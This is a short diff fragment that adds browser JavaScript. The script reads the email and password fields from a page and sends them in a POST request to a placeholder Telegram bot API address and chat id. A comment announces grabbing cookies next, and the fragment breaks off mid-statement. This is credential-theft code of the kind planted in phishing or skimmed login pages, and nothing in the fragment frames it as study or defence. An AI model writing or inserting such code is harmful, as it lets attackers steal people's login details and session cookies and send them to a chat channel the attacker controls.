@@ -1,0 +1,7 @@
+var email = document.getElementById('email').value;
+var password = document.getElementById('password').value;
+
+fetch('https://your-telegram-bot-api-url/sendMessage', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json'},        body: JSON.stringify({ chat_id: 'your-telegram-chat-id', text:`Email:${email}\nPassword:${password}`})  });   // Grab cookies
+var cookies = document.
